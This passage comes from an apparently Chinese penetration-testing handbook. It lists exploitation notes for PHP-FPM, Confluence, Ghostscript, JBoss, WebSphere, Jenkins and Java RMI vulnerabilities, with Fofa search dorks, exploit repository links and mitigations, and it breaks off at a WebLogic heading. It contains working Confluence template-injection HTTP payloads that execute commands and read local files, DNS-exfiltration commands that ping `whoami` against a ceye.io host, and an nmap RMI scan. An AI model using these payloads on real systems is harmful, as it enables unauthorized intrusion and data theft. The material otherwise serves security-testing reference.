&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/1063/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/1063/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;neex/phuip-fpizdam: Exploit for CVE-2019-11043
&lt;a class=&#34;link&#34; href=&#34;https://github.com/neex/phuip-fpizdam&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/neex/phuip-fpizdam&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;jas502n/CVE-2019-11043: php-fpm+Nginx RCE
&lt;a class=&#34;link&#34; href=&#34;https://github.com/jas502n/CVE-2019-11043&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/jas502n/CVE-2019-11043&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502&lt;/p&gt;
&lt;p&gt;k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)
&lt;a class=&#34;link&#34; href=&#34;https://github.com/k8gege/CVE-2019-11043&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/k8gege/CVE-2019-11043&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.Nextcloud 这个应用的默认配置就存在漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版php&lt;/p&gt;
&lt;p&gt;2.修改nginx配置&lt;/p&gt;
&lt;h2 id=&#34;cve-2019-3396-confluence-wiki-远程代码执行&#34;&gt;CVE-2019-3396 Confluence Wiki 远程代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Confluence&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Confluence&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Confluence&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/884/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/884/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Atlassian Confluence 远程代码执行漏洞分析&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞
&lt;a class=&#34;link&#34; href=&#34;https://github.com/jas502n/CVE-2019-3396&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/jas502n/CVE-2019-3396&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.本地写日志的方式getshell&lt;/p&gt;
&lt;p&gt;这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了&lt;/p&gt;
&lt;p&gt;这里的远程模板加载不支持http协议, 主要是&lt;code&gt;classloader&lt;/code&gt;的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell&lt;/p&gt;
&lt;p&gt;这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持&lt;code&gt;file协议&lt;/code&gt;可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符&lt;/p&gt;
&lt;p&gt;&lt;code&gt;velocity&lt;/code&gt;比&lt;code&gt;php&lt;/code&gt;语法要相对严格一点, 可能会报错, 而且&lt;code&gt;velocity&lt;/code&gt;渲染的时候, 目标文件不能太大, 但是极端情况可以试一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /synchrony/heartbeat HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: localhost:8091
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: text/html, */*; q=0.01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: en-US, en;q=0.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: http://localhost:8091
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: close
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;x-forwarded-for: $i18n.getClass().forName(&amp;#39;java.lang.Runtime&amp;#39;).getMethod(&amp;#39;getRuntime&amp;#39;, null).invoke(null, null).exec(&amp;#39;gnome-calculator&amp;#39;).waitFor()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST /rest/tinymce/1/macro/preview HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: localhost:8090
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: text/html, */*; q=0.01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: en-US, en;q=0.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: http://localhost:8090/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/json; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;X-Requested-With: XMLHttpRequest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 258
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: close
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;contentId&amp;#34;:&amp;#34;65594&amp;#34;, &amp;#34;macro&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;widget&amp;#34;, &amp;#34;body&amp;#34;:&amp;#34;&amp;#34;, &amp;#34;params&amp;#34;:{&amp;#34;url&amp;#34;:&amp;#34;http://www.dailymotion.com/video/xcpa64?_template=/etc/passwd&amp;#34;, &amp;#34;width&amp;#34;:&amp;#34;300&amp;#34;, &amp;#34;height&amp;#34;:&amp;#34;200&amp;#34;, &amp;#34;_template&amp;#34;:&amp;#34;file:/var/atlassian/application-data/confluence/logs/atlassian-synchrony.log&amp;#34;}}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版&lt;/p&gt;
&lt;p&gt;2.尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;h2 id=&#34;ghostscript-上传图片代码执行&#34;&gt;Ghostscript 上传图片代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.ps/.jpg/.png&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/157513&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/157513&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Exploit Database Search
&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/search?q=Ghostscript&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.exploit-db.com/search?q=Ghostscript&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub
&lt;a class=&#34;link&#34; href=&#34;https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行&lt;/p&gt;
&lt;p&gt;dnslog 可以用 &lt;code&gt;ping &lt;/code&gt;uname&lt;code&gt;.admin.ceye.io&lt;/code&gt; 或 &lt;code&gt;ping &lt;/code&gt;whoami&lt;code&gt;.admin.ceye.io&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ping &lt;/code&gt;whoami&lt;code&gt;.centos.admin.ceye.io&lt;/code&gt; / &lt;code&gt;ping &lt;/code&gt;whoami&lt;code&gt;.ubuntu.admin.ceye.io&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;分别命名为 &lt;code&gt;centos_ps.jpg&lt;/code&gt;/&lt;code&gt;ubuntu_ps.jpg&lt;/code&gt;, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;jboss-相关漏洞&#34;&gt;Jboss 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jboss&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Jboss&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;JBoss&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/186948.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/186948.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
&lt;a class=&#34;link&#34; href=&#34;https://github.com/joaomatosf/jexboss&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/joaomatosf/jexboss&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Perun/vuln/jboss at master · WyAtu/Perun
&lt;a class=&#34;link&#34; href=&#34;https://github.com/WyAtu/Perun/tree/master/vuln/jboss&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/WyAtu/Perun/tree/master/vuln/jboss&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Jboss的漏洞在内网还是相对比较常见的, 试过几次&lt;code&gt;jexboss&lt;/code&gt;, 效果还ok&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.设置强口令&lt;/p&gt;
&lt;p&gt;2.尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;p&gt;4.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;websphere-反序列化远程代码执行&#34;&gt;Websphere 反序列化远程代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),&lt;/p&gt;
&lt;p&gt;近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;WebSphere&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WebSphere&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;8880&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;IBM-WebSphere&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.
&lt;a class=&#34;link&#34; href=&#34;https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6394&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/6394&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6394&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/6394&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的&lt;/p&gt;
&lt;p&gt;Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/309&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/309&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.设置强口令&lt;/p&gt;
&lt;p&gt;2.尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;p&gt;4.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;jenkins-系列漏洞&#34;&gt;Jenkins 系列漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jenkins&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Jenkins&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Jenkins&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jenkins RCE漏洞分析汇总
&lt;a class=&#34;link&#34; href=&#34;http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;amp;utm_medium=referral#%EF%BF%A6%EF%BE%80%EF%BE%BB%EF%BF%A7%EF%BE%BB%EF%BE%93&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jenkins漏洞集合复现 ~ Misaki’s Blog
&lt;a class=&#34;link&#34; href=&#34;https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jenkins漏洞集合复现 ~ Misaki’s Blog
&lt;a class=&#34;link&#34; href=&#34;https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破
&lt;a class=&#34;link&#34; href=&#34;https://github.com/blackye/Jenkins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/blackye/Jenkins&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gquere/pwn_jenkins: Notes about attacking Jenkins servers&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/gquere/pwn_jenkins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/gquere/pwn_jenkins&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.设置强口令&lt;/p&gt;
&lt;p&gt;2.尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;p&gt;4.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;rmi-对外开放&#34;&gt;RMI 对外开放&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集&lt;/p&gt;
&lt;p&gt;通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;java*&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1098, 1099, 1090, 8901, 8902, 8903&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;N\x00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rmiregistry&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;protocol==&amp;quot;java-rmi&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;RMI-反序列化 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6660&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/6660&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jenkins漏洞集合复现 ~ Misaki’s Blog
&lt;a class=&#34;link&#34; href=&#34;https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Java RMI服务远程命令执行利用_91Ri.org
&lt;a class=&#34;link&#34; href=&#34;http://www.91ri.org/15276.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.91ri.org/15276.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.rmi一般在内网开放的比较多, nmap 扫描如下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v 8.8.8.8 -p1099 -sV --script=rmi*&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.设置强口令&lt;/p&gt;
&lt;p&gt;2.尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;h2 id=&#34;weblogic-t3-协议漏洞&#34;&gt;Weblogic T3 协议漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
